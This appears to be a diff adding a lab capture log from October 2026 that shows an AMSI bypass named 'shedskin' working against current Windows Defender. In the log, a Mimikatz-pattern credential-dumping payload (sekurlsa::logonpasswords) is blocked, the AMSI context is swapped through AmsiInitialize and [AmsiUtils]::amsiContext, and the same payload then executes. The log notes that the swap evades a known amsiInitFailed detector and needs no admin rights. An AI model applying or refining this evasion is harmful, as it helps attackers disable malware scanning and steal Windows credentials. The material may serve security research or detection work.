@@ -1,0 +1,29 @@
+# Live end-to-end shedskin cycle on current Defender
+# Captured 2026-10-29 on win11 26200.8037, Defender sig 1.459.576.0, engine 1.1.26080.3
+# Script: shedskin-min.ps1 (XOR-obfuscated outer-pass launcher)
+
+WX.K registered: True
+oracle-before_cycle eicar=32768          # oracle alive
+oldCtx=0x26da64eda30                     # SMA's original lazy-inited AMSI context
+amsiInitFailed_before=False              # pre-cycle, False (as expected)
+
+=== P1 pre-shedskin IEX (expect BLOCK) ===
+P1_BLOCKED: ParseException: At line:1 char:1
+# IEX of the Mimikatz-pattern payload blocked by AMSI PS pack
+
+=== P2 apply shedskin ===
+shed_init hr=0x0 newCtx=0x26da680b900    # AmsiInitialize('x', ...) returns new context
+ctx_now=0x26da680b900                    # [AmsiUtils]::amsiContext written
+amsiInitFailed_after=False               # Rastamouse detector would see True; shedskin stays False
+
+=== P3 post-shedskin IEX of SAME payload (expect EXEC) ===
+SHED_EXEC
+sekurlsa::logonpasswords
+# IEX of the SAME Mimikatz-pattern payload now executes. Function body runs.
+
+oracle-after_cycle eicar=32768           # oracle alive at end
+
+sig   : 1.459.576.0
+engine: 1.1.26080.3
+build : 10.0.26200
+user  : MWS-W11-LAB$ @ WORKGROUP (via qemu-guest-agent as SYSTEM; primitive itself requires no admin)
